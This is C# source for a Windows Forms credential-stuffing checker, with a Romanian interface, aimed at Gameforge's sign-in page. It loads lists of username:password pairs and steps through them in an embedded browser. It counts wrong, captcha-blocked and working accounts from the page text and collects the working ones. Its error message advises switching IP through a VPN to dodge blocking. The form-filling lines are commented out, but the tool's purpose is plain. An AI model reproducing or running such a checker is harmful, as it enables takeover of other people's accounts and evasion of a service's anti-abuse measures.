using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace verifyCont
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {

            HtmlDocument doc1 = webBrowser1.Document;
            

            try
            {
                string[] part = listBox1.SelectedItem.ToString().Split(':');
                textBox1.Text = webBrowser1.DocumentText;

                //HtmlElement user = doc1.GetElementById("tnte9e60812-f3ce-4fa8-ae94-198bcf80bee2");
                //HtmlElement pass = doc1.GetElementById("password");
                //HtmlElement send = doc1.GetElementById("button tnta3ae34d4-6a49-4e4e-853a-ddb1e8d97787 tnt04104f69-a4e9-41cf-be63-be1905dacd68 tnt91044618-d4da-4b07-b30c-cceacb6c1581 tnte65b905d-0785-4843-8449-790a3cfb31fa tnte71d4971-a2e1-42ff-87f1-6a04526ac090");

                //user.SetAttribute("value", part[0].ToString());
                //pass.SetAttribute("value", part[1].ToString());
                //send.InvokeMember("Click");
            }
            catch (Exception)
            {
                //timer1.Stop();
                MessageBox.Show("Pagină albă. Schimbă IP-ul - foloseşte VPN.");
            }
                try
                {
                    listBox1.SelectedIndex += 1;
                }
                catch (Exception)
                {
                    //timer1.Stop();
                    MessageBox.Show("Toate conturile au fost verificate.");
                }
            }

        private void Form1_Load(object sender, EventArgs e)
        {
            webBrowser1.Navigate("https://gameforge.com/ro-RO/sign-in");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {

                DialogResult dr = this.openFileDialog1.ShowDialog();
                string[] lines = System.IO.File.ReadAllLines(openFileDialog1.FileName);
                foreach (string line in lines)
                    listBox1.Items.Add(line);
                label3.Text = "Conturi încărcate: " + listBox1.Items.Count.ToString();
                listBox1.SelectedIndex = 0;
            }
            catch (Exception)
            {

            }
        }
        
        int wrong, captcha, good;
        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            if (webBrowser1.ReadyState != WebBrowserReadyState.Complete)
                return;
            textBox1.Text = webBrowser1.DocumentText;

            try
            {
                if (textBox1.Text.Contains("greşite."))
                {
                    wrong +=1;
                    label1.Text = "GREŞITE: " + wrong.ToString();
                }
                if (textBox1.Text.Contains("Confirma"))
                {
                    captcha +=1;
                    textBox2.Text += listBox1.Items[listBox1.SelectedIndex - 1] + "\r".ToString();
                    label2.Text = "CAPTCHA: " + captcha.ToString();
                }
                if (textBox1.Text.Contains("Parolă"))
                {
                    good +=1;
                    textBox2.Text += listBox1.Items[listBox1.SelectedIndex - 1] + "\r".ToString();
                    label4.Text = "DIRECTE: " + good.ToString();
                    //webBrowser1.Navigate(textBox3.Text);
                }
                if (textBox1.Text.Contains("întreţinere"))
                {
                    label6.Text = "MENTENANŢĂ: " + 1.ToString();
                }
            }
            catch (Exception)
            {

            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            //webBrowser1.Navigate(textBox3.Text);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            //timer1.Start();
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            label5.Text = "Conturi funcţionale: " + (textBox2.Lines.Count()-1);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            button1_Click(null, null);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            //timer1.Stop();
        }
    }
}